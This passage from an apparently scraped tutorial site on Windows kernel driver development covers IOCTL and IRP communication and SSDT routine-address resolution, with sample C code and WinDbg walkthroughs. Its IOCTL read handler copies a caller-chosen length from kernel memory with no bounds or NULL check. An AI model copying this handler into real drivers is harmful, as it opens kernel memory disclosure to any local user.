0, \"Failed to Create I/O Device!\\n\"); return Status; } Status = IoCreateSymbolicLink(\u0026SymName, \u0026DeviceName); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Symbolic Link!\\n\"); return Status; } DriverObject-\u003eMajorFunction[IRP_MJ_CREATE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_CLOSE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl; DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); DbgPrintEx(0, 0, \"Unloading the Driver...\\n\"); IoDeleteSymbolicLink(\u0026SymName); IoDeleteDevice(DriverObject-\u003eDeviceObject); return STATUS_SUCCESS; } If you are familiar with the previous IRP documentation, you will already understand that the code is almost identical. Let‚Äôs take a closer look:\n#define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) The CTL_CODE macro is used to define IOCTL codes, and it creates an IOCTL code from various parameters:\nDeviceType ‚Äì Specifies the type of device. This can be FILE_DEVICE_UNKNOWN, FILE_DEVICE_DISK, FILE_DEVICE_KEYBOARD, and others. In our case, we use FILE_DEVICE_UNKNOWN to indicate that we‚Äôre not targeting a specific hardware type, but rather a generic device type.\nFunctionCode ‚Äì Specifies a unique code for the IOCTL operation. This is a number that identifies the operation and is typically defined by the application or driver developer. For example, it could be values like 0x800 or 0x801.\nMethod ‚Äì Defines how the IOCTL operation transfers data. Possible values include METHOD_BUFFERED, METHOD_IN_DIRECT, METHOD_OUT_DIRECT, and METHOD_NEITHER.\nAccess ‚Äì Specifies the access permissions required for the IOCTL operation. Examples include FILE_ANY_ACCESS, FILE_SHARE_READ, and FILE_SHARE_WRITE.\nUNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; NTSTATUS Status; These store the driver‚Äôs device name and symbolic name, respectively, which we will use to identify and access the driver.\nStatus = IoCreateDevice(DriverObject, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create I/O Device!\\n\"); return Status; } Here, we call IoCreateDevice to create a device object for our driver. This object is stored in the DeviceObject variable.\nStatus = IoCreateSymbolicLink(\u0026SymName, \u0026DeviceName); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Symbolic Link!\\n\"); return Status; } Next, we create a symbolic link using IoCreateSymbolicLink. This allows a user-mode program to access the driver via its symbolic name.\nWe then set up the major function callbacks:\nDriverObject-\u003eMajorFunction[IRP_MJ_CREATE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_CLOSE] = IoCreateClose; DriverObject-\u003eMajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl; DriverObject-\u003eDriverUnload = UnloadDriver; Now we can take a look at IoControl:\nPIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PVOID Data = Irp-\u003eAssociatedIrp.SystemBuffer; PCHAR UserBuffer = (PCHAR)Data; ULONG OutLength = Stack-\u003eParameters.DeviceIoControl.OutputBufferLength; ULONG Length = Stack-\u003eParameters.DeviceIoControl.InputBufferLength; ULONG Tag = TAG; We get the current IRP stack location using IoGetCurrentIrpStackLocation.\nWe retrieve data sent from user-mode via Irp-\u003eAssociatedIrp.SystemBuffer.\nWe extract the input and output buffer sizes from the DeviceIoControl parameters.\nWe define a memory allocation TAG to identify our memory block in pool tracking.\nswitch (Stack-\u003eParameters.DeviceIoControl.IoControlCode) { case IOCTL_MEM_ALLOCATE: if (NULL == UserBuffer || 0 == Length) { Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; break; } GlobalMemoryAddr = ExAllocatePool2(POOL_FLAG_NON_PAGED, Length, Tag); if (NULL == GlobalMemoryAddr) { Irp-\u003eIoStatus.Status = STATUS_INSUFFICIENT_RESOURCES; Irp-\u003eIoStatus.Information = 0; break; } RtlCopyMemory(GlobalMemoryAddr, UserBuffer, Length); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; break; case IOCTL_MEM_READ: RtlCopyMemory(UserBuffer, GlobalMemoryAddr, OutLength); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = OutLength; break; default: Irp-\u003eIoStatus.Status = STATUS_INVALID_DEVICE_REQUEST; Irp-\u003eIoStatus.Information = 0; break; } IoCompleteRequest(Irp, IO_NO_INCREMENT); We check IoControlCode to determine the requested operation.\nIOCTL_MEM_ALLOCATE\nValidate input parameters. Allocate non-paged kernel memory using ExAllocatePool2. Copy user-mode data into kernel memory using RtlCopyMemory. IOCTL_MEM_READ\nCopy data from the allocated kernel buffer back to user-mode. Default\nReturn an error for unsupported IOCTL codes. User Mode Program #include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define DEVICE_NAME L\"\\\\\\\\.\\\\MyDevice\" #define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) int main(int argc, char* argv[]) { HANDLE HandleDevice = NULL; CHAR InBuffer[] = \"Piyanis bana biraaak\"; CHAR OutBuffer[sizeof(InBuffer)] = { 0 }; DWORD InputBytesReturned = 0; DWORD OutputBytesReturned = 0; BOOL Result = 0; HandleDevice = CreateFile(DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to connect Driver! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Result = DeviceIoControl(HandleDevice, IOCTL_MEM_ALLOCATE, InBuffer, sizeof(InBuffer), NULL, 0, \u0026InputBytesReturned, NULL); if (!Result) { printf(\"Failed to Allocate Memory! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Result = DeviceIoControl(HandleDevice, IOCTL_MEM_READ, NULL, 0, OutBuffer, sizeof(OutBuffer), \u0026OutputBytesReturned, 0); if (!Result) { printf(\"Failed to get Data!\\n\"); return -1; } printf(\"Output Buffer: %s\\n\", OutBuffer); return 0; } Let‚Äôs see the code:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define DEVICE_NAME L\"\\\\\\\\.\\\\MyDevice\" #define IOCTL_MEM_ALLOCATE \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) #define IOCTL_MEM_READ \\ CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) We define the device name and the same IOCTL codes that the driver understands.\nHANDLE HandleDevice = CreateFile( DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to connect Driver! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Here, we connect to the driver using CreateFile.\nCHAR InBuffer[] = \"Piyanis bana biraaak\"; CHAR OutBuffer[sizeof(InBuffer)] = { 0 }; DWORD InputBytesReturned = 0; DWORD OutputBytesReturned = 0; BOOL Result = DeviceIoControl( HandleDevice, IOCTL_MEM_ALLOCATE, InBuffer, sizeof(InBuffer), NULL, 0, \u0026InputBytesReturned, NULL ); We Send IOCTL_MEM_ALLOCATE to the driver with our input data. If the call fails, print the error and exit.\nResult = DeviceIoControl( HandleDevice, IOCTL_MEM_READ, NULL, 0, OutBuffer, sizeof(OutBuffer), \u0026OutputBytesReturned, 0 ); if (!Result) { printf(\"Failed to get Data!\\n\"); return -1; } printf(\"Output Buffer: %s\\n\", OutBuffer); Then we send anohter IOCTL Code, IOCTL_MEM_READ to retrieve the data from kernel memory. This time, no input buffer is provided (NULL, 0). The driver writes the result to OutBuffer, which we print to the console.\nRunning the Project As you can see, when we run our program, we can see that Windbg prints the data sent by the user-mode program to the screen, and then prints the data sent by the driver to the user-mode program to the screen.\nConclusion In this documentation, we have explored the complete process of implementing a simple Windows kernel-mode driver that communicates with a user-mode application using IOCTL (Input/Output Control) codes.\nWe demonstrated how to define IOCTL codes using the CTL_CODE macro, create device and symbolic link objects in the kernel, and handle IRP requests in the driver. Specifically, we implemented memory allocation and memory reading operations in kernel space and exposed them to user-mode applications.\nReferences Windows Docs - Introduction to I/O Control Codes Windows Docs - Device Input and Output Control "},"title":"IOCTL"},"/docs/winkernel-dev/wkd-irp/":{"data":{"":"","#":"In this documentation, we will discuss IRP.\nWhat is I/O Request Packet An I/O Request Packet (IRP) in the Windows operating system is a structure used to facilitate communication between drivers and the operating system. You can think of it as a ‚Äúmessage carrier‚Äù.\nIn most cases, requests sent to drivers are packaged into an IRP. An operating system component or another driver sends an IRP to a driver using the IoCallDriver function. This function takes two parameters: a device object (DEVICEOBJECT) and a pointer to an IRP. The device object points to the driver object associated with that device. Therefore, when IoCallDriver is called, the IRP is sent to the corresponding device object and, by extension, to its associated driver. This process is often referred to as ‚Äúpassing‚Äù or ‚Äúforwarding‚Äù the IRP.\nAn IRP is often processed by multiple drivers, which are arranged in a specific order. While being processed, drivers are treated like layers in a stack. The IRP first reaches the driver at the top of the stack. Each driver processes the IRP in turn, performs the necessary operations, and then passes it on to the next driver in the stack. This step-by-step processing continues until the IRP has passed through all the relevant drivers. Once the processing is complete, the desired operation is performed, and the result is returned.\nAn IRP also serves as the mechanism for handling user-initiated operations within the kernel. It ensures that drivers receive and respond to requests in a consistent and structured way. For example, when you print a document, the request is sent as an IRP to the printer driver. The printer driver receives the IRP and initiates the printing process. This system provides a safe and efficient bridge between user operations and hardware.\nCoding We will create two separate projects for the sample code. In the first project we will create a driver and I will talk about how to handle IRP. In the other project we will create a user mode program and in this program I will show how to send IRP to the driver using the WriteFile function.\nKernel Mode Driver #include \"main.h\" NTSTATUS IrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); DbgPrintEx(0, 0, \"\\n\\nMJ_Create Received!\\n\"); Irp-\u003eIoStatus.Status = STATUS_SUCCESS;; Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS IrpWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PCHAR Buffer = Irp-\u003eUserBuffer; ULONG Length = Stack-\u003eParameters.Write.Length; DbgPrintEx(0, 0, \"\\n\\nMJ_WRITE Received!\\n\"); if (NULL == Buffer || 0 == Length) { DbgPrintEx(0, 0, \"Failed to Received Data!\\n\"); Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; return Irp-\u003eIoStatus.Status; } DbgPrintEx(0, 0, \"Data to be written received: %.*s\\n\", Length, Buffer); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; } NTSTATUS DriverEntry(PDRIVER_OBJECT PDrvObj, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; NTSTATUS Status; Status = IoCreateDevice( PDrvObj, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create IO Device!\\n\"); return Status; } Status = IoCreateSymbolicLink( \u0026SymName, \u0026DeviceName ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Smybolic Link!\\n\"); return Status; } PDrvObj-\u003eMajorFunction[IRP_MJ_CREATE] = IrpCreate; PDrvObj-\u003eMajorFunction[IRP_MJ_WRITE] = IrpWrite; return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT PDrvObj) { UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); DbgPrintEx(0, 0, \"Unloading Driver...\\n\"); IoDeleteSymbolicLink(\u0026SymName); IoDeleteDevice(PDrvObj-\u003eDeviceObject); return STATUS_SUCCESS; } It looks very long, but I assure you it is a very simple driver code. Let‚Äôs look at the code step by step and start with the DriverEntry function:\nUNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDevice\"); UNICODE_STRING SymName = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDevice\"); PDEVICE_OBJECT DeviceObject; First, we define two UNICODE_STRING variables called DeviceName and SymName. These two variables hold the name and symbolic name of our driver.\nStatus = IoCreateDevice( PDrvObj, 0, \u0026DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, \u0026DeviceObject ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create IO Device!\\n\"); return Status; } Then we create a device object with the IoCreateDevice function. This function creates a device object for our driver and assigns it to the DeviceObject variable.\nStatus = IoCreateSymbolicLink( \u0026SymName, \u0026DeviceName ); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create Smybolic Link!\\n\"); return Status; } We create a symbolic link with the IoCreateSymbolicLink function. In this way, we will be accessing our drive using the name and symbolic name of the drive in our user mode program.\nPDrvObj-\u003eMajorFunction[IRP_MJ_CREATE] = IrpCreate; PDrvObj-\u003eMajorFunction[IRP_MJ_WRITE] = IrpWrite; Finally, we specify the IRP functions of our driver. These functions determine how our driver handles IRPs. In the code, we use IrpCreate and IrpWrite. MJ_CREATE determines what our drive does when a file is created. IrpWrite determines what our driver does when a file is written to. IRPs are passed to our driver through these functions and our driver processes the IRPs through these functions.\nNow let‚Äôs take a look at our functions to handle IRP requests:\nNTSTATUS IrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); DbgPrintEx(0, 0, \"\\n\\nMJ_Create Received!\\n\"); ... Firstly, when we look at IrpCreate, it takes the DeviceObject and Irp parameters. These parameters represent our driver‚Äôs device object and IRP, as mentioned above. Then, we print an information message using the DbgPrintEx function.\nIrp-\u003eIoStatus.Status = STATUS_SUCCESS;; Irp-\u003eIoStatus.Information = 0; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; In the last part of the MJ_CREATE function, we set the status and information of the IRP. This status and information determine the result of the IRP operation. Finally, we complete the IRP with the IoCompleteRequest function and terminate the operation.\nNow let‚Äôs look at the IrpWrite function:\nNTSTATUS IrpWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp); PCHAR Buffer = Irp-\u003eUserBuffer; ULONG Length = Stack-\u003eParameters.Write.Length; ... Stack variable represents the stack location of the IRP. Buffer variable represents the data area of the IRP. This data area contains the data carried by the IRP. Length variable represents the data length of the IRP. This length specifies the length of the data carried by the IRP. if (NULL == Buffer || 0 == Length) { DbgPrintEx(0, 0, \"Failed to Received Data!\\n\"); Irp-\u003eIoStatus.Status = STATUS_INVALID_PARAMETER; Irp-\u003eIoStatus.Information = 0; return Irp-\u003eIoStatus.Status; } We check whether the Buffer pointer is NULL and whether the Length value is 0.\nIf the condition is met, i.e., no data has been received, we set the value of Irp-\u003eIoStatus.Status to STATUS_INVALID_PARAMETER. This indicates a parameter error. We set the value of Irp-\u003eIoStatus.Information to 0. Finally, the IRP‚Äôs operation status is returned, and the process is terminated.\nDbgPrintEx(0, 0, \"Data to be written received: %.*s\\n\", Length, Buffer); Irp-\u003eIoStatus.Status = STATUS_SUCCESS; Irp-\u003eIoStatus.Information = Length; IoCompleteRequest(Irp, IO_NO_INCREMENT); return Irp-\u003eIoStatus.Status; In this section, if the data has been retrieved correctly, we print this data. Then, in the same way, we set the status and information of the IRP and terminate the process.\nUser Mode Program Now let‚Äôs create our user mode program. In this program, we will send an IRP to our driver using the WriteFile function.\n#include \"main.h\" int main(int argc, char* argv[]) { HANDLE\tHandleDevice = NULL; CHAR\tBuffer[] = \"Hello, kernel!\"; DWORD\tBytesWritten = 0; DWORD\tBytesRead = 0; BOOL\tStatus\t= 0; HandleDevice = CreateFile( DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to Open Device! Error Code: 0x%lx\\n\", GetLastError()); return -1; } Status = WriteFile( HandleDevice, Buffer, (DWORD)sizeof(Buffer), \u0026BytesWritten, NULL ); if (!Status) { printf(\"Failed to Write Data!\\n\"); CloseHandle(HandleDevice); return -1; } CloseHandle(HandleDevice); return 0; } Now let‚Äôs take a closer look:\nHandleDevice = CreateFile( DEVICE_NAME, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); if (INVALID_HANDLE_VALUE == HandleDevice) { printf(\"Failed to Open Device! Error Code: 0x%lx\\n\", GetLastError()); return -1; } First, we open our drive using CreateFile in our program. This function opens our drive and returns a handle.\nSome may wonder, ‚ÄúIs the drive opened using CreateFile?‚Äù . The CreateFile function can be used to create or open a file or device object in the Windows operating system. You can refer to the documentation for further research.\nStatus = WriteFile( HandleDevice, Buffer, (DWORD)sizeof(Buffer), \u0026BytesWritten, NULL ); if (!Status) { printf(\"Failed to Write Data!\\n\"); CloseHandle(HandleDevice); return -1; } In this section, we send an IRP request to our drive using the WriteFile function.\nRunning the Project Here‚Äôs the result:\nAs you can see, when we run our user mode program, we see that it sends data to the driver and prints the sent data to the screen:\nConclusion An I/O Request Packet (IRP) is Windows‚Äô standard mechanism for delivering requests from user-mode applications to kernel-mode drivers. In our example, the driver registered specific routines (IrpCreate, IrpWrite) to handle incoming IRPs, while the user-mode program opened the device with CreateFile and sent data using WriteFile, which internally generated an IRP.\nReferences Microsoft Docs - I/O Request Packets "},"title":"IRP"},"/docs/winkernel-dev/wkd-ssdt/":{"data":{"":"","#":"In this documentation we will discuss SSDT in the windows systems.\nWhat is SSDT? So, SSDT (System Service Descriptor Table) is a list of system calls supported by the operating system. Recall the syscalls. SSDT is the first member of the Service Descriptor Table kernel memory structure:\ntypedef struct tagSERVICE_DESCRIPTOR_TABLE { SYSTEM_SERVICE_TABLE nt; // SSDT Tablosu kendisine etkili bir pointer SYSTEM_SERVICE_TABLE win32k; SYSTEM_SERVICE_TABLE sst3; SYSTEM_SERVICE_TABLE sst4; } SERVICE_DESCRIPTOR_TABLE; SSDT maps system calls (syscalls) to kernel API addresses. When a syscall is made by a user-mode program, it contains a service index. This index specifies which syscall to use. The operating system uses this index to parse the address of the corresponding function from the System Service Descriptor Table (SSDT) and redirects to the correct kernel function in ntoskrnl.exe. In case it sounds confusing, let me explain it in a diagram:\nLet‚Äôs say you call CreateFile from User-Mode and the syscall number is 0x2. When the syscall is executed, the flow continues from the kernel space. You can see this in the diagram.\nWhen switching to the kernel space, the first section will be SSDT (KiServiceTable). Here I would like you to think that it typically contains a list of offsets to access Kernel Routine Addresses. The offset is calculated with the corresponding syscall number and then redirected to the corresponding Routine Address. Thus NtCreateFile is executed. The following formula is used for the calculation:\nOffset = KiServiceTableAddress + 4 * SSN In short, SSDT and syscalls act as a bridge between API calls from user-mode and the corresponding kernel routine addresses. In this way, the kernel determines which function responds to a system call from user-mode space.\nAnalysis with WinDBG Now let‚Äôs take a look at this SSDT with WinDBG:\nThe first address given in the output is fffff800798c7cb0, the address of the SSDT.\nI wanted you to think of SSDT as a table, so let‚Äôs take a look at a few offsets in the table with the address:\nThe first 5 offsets from the table are sorted as shown. Now let‚Äôs take 056b3400 from these offsets and calculate its address.\nIf you look at the diagram again, the following formula is used to access the kernel routine address:\nKernelRoutineAddress = KiServiceTableAddress + ( Offset \u003e\u003e\u003e 4 ) Now let‚Äôs take a look at the address of the routine using this formula:\nAs you can see, the offset we took as an example belongs to NtWaitForSingleObject.\nFinding Routine Address with Syscall Now let‚Äôs see how we can find the Routine address using Syscall.\nI mentioned NtCreateFile as an example. With WinDBG we can find the SSN number of this API from ntdll.dll:\nWe see that 0x55 is passed to the eax register. This is the syscall number of NtCreateFile.\nNow let‚Äôs calculate the offset using this syscall number and then access the routine address:\nAs we can see from the output, the routine address of NtCreateFile is fffff80431a2d240. We can recreate the diagram to better understand these steps:\nCoding Let‚Äôs simply code what we have learned using the Kernel Driver.\nOur scenario is that we will create a .txt file using the NtCreateFile and NtWriteFile APIs and write some text in it, but we will take the kernel routine addresses of the APIs and run the APIs directly from the routine address.\n#pragma warning(disable: 4083 4005) #include \"main.h\" #define KiServiceTableAddress 0xfffff800798c7cb0 #define SSN_NtCreateFile 0x55 #define SSN_NtWriteFile 0x8 typedef (NTAPI* My_NtCreateFile)( _Out_ PHANDLE FileHandle, _In_ ACCESS_MASK DesiredAccess, _In_ POBJECT_ATTRIBUTES ObjectAttributes, _Out_ PIO_STATUS_BLOCK IoStatusBlock, _In_opt_ PLARGE_INTEGER AllocationSize, _In_ ULONG FileAttributes, _In_ ULONG ShareAccess, _In_ ULONG CreateDisposition, _In_ ULONG CreateOptions, _In_reads_bytes_opt_(EaLength) PVOID EaBuffer, _In_ ULONG EaLength ); typedef (NTAPI* My_NtWriteFile)( IN HANDLE FileHandle, IN HANDLE Event OPTIONAL, IN PIO_APC_ROUTINE ApcRoutine OPTIONAL, IN PVOID ApcContext OPTIONAL, OUT PIO_STATUS_BLOCK IoStatusBlock, _In_reads_bytes_(Length) PVOID Buffer, IN ULONG Length, IN PLARGE_INTEGER ByteOffset OPTIONAL, IN PULONG Key OPTIONAL ); uint32_t ReadMemory(uint64_t Address) { return *(volatile uint32_t*)Address; } uint64_t GetAbsoluteAddress(int SSN, UNICODE_STRING APIName) { if (0 == SSN) { DbgPrintEx(0, 0, \"SSN is 0\\n\"); return 0; } DbgPrintEx(0, 0, \"Target API Name: %wZ\\n\", APIName); uint64_t RoutineAbsoluteAddress = 0; uint64_t OffsetAddress; uint32_t Offset = 0; OffsetAddress = KiServiceTableAddress + 4 * SSN; DbgPrintEx(0, 0, \"Offset Address: 0x%llx\\n\", OffsetAddress); Offset = ReadMemory(OffsetAddress); DbgPrintEx(0, 0, \"Offset: 0x%08x\\n\", Offset); RoutineAbsoluteAddress = KiServiceTableAddress + (Offset \u003e\u003e 4); DbgPrintEx(0, 0, \"The absolute address of %wZ is: 0x%llx\\n\", APIName, RoutineAbsoluteAddress); return RoutineAbsoluteAddress; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); DriverObject-\u003eDriverUnload = UnloadDriver; HANDLE HandleFile = NULL; OBJECT_ATTRIBUTES ObjAttr; IO_STATUS_BLOCK IoStatusBlock; NTSTATUS Status = STATUS_SUCCESS; uint64_t Address = 0; UNICODE_STRING FileName; UNICODE_STRING NtCreateFileName; UNICODE_STRING NtWriteFileName; UNICODE_STRING Data; RtlInitUnicodeString(\u0026NtCreateFileName, L\"NtCreateFile\"); RtlInitUnicodeString(\u0026NtWriteFileName, L\"NtWriteFile\"); RtlInitUnicodeString(\u0026FileName, L\"\\\\??\\\\C:\\\\ssdt.txt\"); RtlInitUnicodeString(\u0026Data, L\"Hello SSDT!\"); InitializeObjectAttributes(\u0026ObjAttr, \u0026FileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);\tAddress = GetAbsoluteAddress(SSN_NtCreateFile, NtCreateFileName); if (0 == Address) { return STATUS_NOT_FOUND; } My_NtCreateFile MyNtCreateFile = (My_NtCreateFile)Address; Status = MyNtCreateFile(\u0026HandleFile, GENERIC_WRITE, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, \\ 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create File! Error: 0x%08x\\n\", Status); return Status; } DbgPrintEx(0, 0, \"Created File!\\n\\n\"); Address = GetAbsoluteAddress(SSN_NtWriteFile, NtWriteFileName); if (0 == Address) { return STATUS_NOT_FOUND; } My_NtWriteFile MyNtWriteFile = (My_NtWriteFile)Address; Status = MyNtWriteFile(HandleFile, NULL, NULL, NULL, \u0026IoStatusBlock, Data.Buffer, Data.Length, NULL, NULL); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to ZwWriteFile! Error: 0x%08x\\n\", Status); ZwClose(HandleFile); return Status; } DbgPrintEx(0, 0, \"Wrote to File\\n\\n\"); ZwClose(HandleFile); return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Unloading the Driver...\\n\"); return STATUS_SUCCESS; } This is our code. Let‚Äôs start analyzing in detail:\n#define KiServiceTableAddress 0xfffff800798c7cb0 #define SSN_NtCreateFile 0x55 #define SSN_NtWriteFile 0x8 First, in the project, we define the address of the KiServiceTable and the SSN numbers of the two APIs. Change the address of SSDT and SSN numbers which you get from WinDbg.\nAddress = GetAbsoluteAddress(SSN_NtCreateFile, NtCreateFileName); if (0 == Address) { return STATUS_NOT_FOUND; } In Driverentry, we call the GetAbsoluteAddress function with the SSN number and the name of the API. With this API, we will get the kernel routine address of the API.\nOffsetAddress = KiServiceTableAddress + 4 * SSN; DbgPrintEx(0, 0, \"Offset Address: 0x%llx\\n\", OffsetAddress); When we look at the codes of the GetAbsoluteAddress function, we make the calculation mentioned before to find the address of the Offset in SSDT. Then we print the offset address.\nOffset = ReadMemory(OffsetAddress); DbgPrintEx(0, 0, \"Offset: 0x%08x\\n\", Offset); Then we obtain the offset by reading the content of the address we received and in the same way we print the offset to the screen.\nRoutineAbsoluteAddress = KiServiceTableAddress + (Offset \u003e\u003e 4); DbgPrintEx(0, 0, \"The absolute address of %wZ is: 0x%llx\\n\", APIName, RoutineAbsoluteAddress); Finally, we apply the formula to access the corresponding routine address.\nMy_NtCreateFile MyNtCreateFile = (My_NtCreateFile)Address; Status = MyNtCreateFile(\u0026HandleFile, GENERIC_WRITE, \u0026ObjAttr, \u0026IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, \\ 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to Create File! Error: 0x%08x\\n\", Status); return Status; } DbgPrintEx(0, 0, \"Created File!\\n\\n\"); After getting the routine address of NtCreateFile, we give this address to the MyNtCreateFile structure we created and then call the NtCreateFile API using the routine address.\n// NtWriteFile'in Routine adresini al Address = GetAbsoluteAddress(SSN_NtWriteFile, NtWriteFileName); if (0 == Address) { return STATUS_NOT_FOUND; } My_NtWriteFile MyNtWriteFile = (My_NtWriteFile)Address; // NtWriteFile'i √ßaƒüƒ±r Status = MyNtWriteFile(HandleFile, NULL, NULL, NULL, \u0026IoStatusBlock, Data.Buffer, Data.Length, NULL, NULL); if (!NT_SUCCESS(Status)) { DbgPrintEx(0, 0, \"Failed to ZwWriteFile! Error: 0x%08x\\n\", Status); ZwClose(HandleFile); return Status; } DbgPrintEx(0, 0, \"Wrote to File\\n\\n\"); After running NtCreateFile, we get the routine address of NtWriteFile with the same codes and give the address to the structure we created and then run the NtWriteFile API.\nAnalyzing Driver Now let‚Äôs follow Driver step by step and see what it does. I think this will help us to better understand it.\nFirstly add the bp to the driver name, then run it. After running it, we need to get an output on the WinDBG screen that bp is triggered:\nThen add a bp to GetAbsoluteAddress function to see the addresses we obtained and continue the program:\nkd\u003e bp SSDT!GetAbsoluteAddress kd\u003e g Breakpoint 1 hit SSDT!GetAbsoluteAddress: fffff802`333c12f0 4889542410 mov qword ptr [rsp+10h],rdx We can examine the GetAbsoluteAddress function in the Disassembly screen. Our first section will be the part where we calculate the address of Offset:\nFirst, we see that the value of the SSN variable, which is the first parameter of the function, is transferred to the eax register. Since the program enters the GetAbsoluteAddress function for the first time, we know that 0x55, NtCreateFile, contains the SSN number.\nThen the received SSN number shl eax,2 shifts the value of eax 2 bits to the left. Let‚Äôs look at the formula for this part again to understand what it does:\nOffset = KiServiceTableAddress + 4 * SSN Now you may ask this: ‚ÄúThe formula is multiplying, but in the background it is shifting 2 bits to the left‚Äù.\nThe shift left (shl) operation is equivalent to multiplying a number by a multiple of 2. Here shl eax, 2 multiplies eax by 4. To verify this, we can add a bp in this section and see what eax gets:\nIn this image, we can see the value of eax before and after the operation. Before the operation the 